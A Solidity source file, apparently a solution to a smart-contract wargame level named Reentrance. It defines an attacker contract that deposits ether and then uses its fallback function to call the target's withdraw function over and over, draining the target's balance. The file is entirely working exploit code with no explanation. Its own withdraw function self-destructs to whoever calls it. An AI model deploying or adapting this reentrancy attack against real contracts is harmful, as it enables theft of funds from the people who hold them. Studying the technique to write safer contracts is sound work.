pragma solidity ^0.4.20;

contract Reentrance {
    function donate(address _to) public payable;

    function balanceOf(address _who) public view returns (uint balance);

    function withdraw(uint _amount) public;
    function() public payable;
}

contract Reentrancer {
    Reentrance public reentrance;
    function Reentrancer (address _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function collect () public payable {
        // initiate the balance with some value
        reentrance.donate.value(msg.value)(address(this));
        // start the recursion
        reentrance.withdraw(msg.value);
    }
  
    function withdraw () public {
        selfdestruct(msg.sender);
    }
  
    function () public payable {
        // stop the recursion if there is no longer enough eth in the contract
        if (address(reentrance).balance >= msg.value) {
            // recursively call withdraw that will call this back
            reentrance.withdraw(msg.value);
        }
    }
}
